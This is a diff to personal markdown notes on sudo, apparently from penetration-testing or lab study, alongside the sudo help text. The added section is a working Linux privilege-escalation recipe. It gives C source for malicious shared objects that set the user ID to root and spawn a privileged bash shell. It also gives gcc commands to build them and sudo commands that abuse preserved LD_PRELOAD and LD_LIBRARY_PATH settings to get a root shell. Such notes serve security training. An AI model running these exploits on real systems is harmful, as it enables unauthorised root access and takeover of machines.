@@ -1,5 +1,72 @@
 
-###### sudo -h
+sudo -l    lists what you can run
+
+sudo su -
+
+
+
+### env vars
+
+if sudo -l shows environment variables like:
+```sh
+user@debian:~$ sudo -l
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+...
+```
+
+#### env_keep+=LD_PRELOAD
+
+preload.c
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        unsetenv("LD_PRELOAD");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+Create a shared object using the code located at /home/user/tools/sudo/preload.c:
+`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so ./preload.c`
+
+Run `more` or another with sudo perms, while setting the LD_PRELOAD env var to the full path of the new shared object:
+`sudo LD_PRELOAD=/tmp/preload.so more`
+
+#### env_keep+=LD_LIBRARY_PATH
+
+```sh
+user@debian:/tmp$ ldd /usr/sbin/apache2
+        linux-vdso.so.1 =>  (0x00007fffaa16a000)
+		...
+		libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f1194436000)
+		...
+```
+
+library_path.c
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code above:
+`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`
+
+Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):
+`sudo LD_LIBRARY_PATH=/tmp apache2`
+
+### Help
 
 ```sh
 sudo - execute a command as another user
@@ -56,10 +123,4 @@ Options:
                                 command
   --                            stop processing command line arguments
 ```
-
-###### useful commands
-
-sudo -l    lists what you can run
-
-sudo su -
 
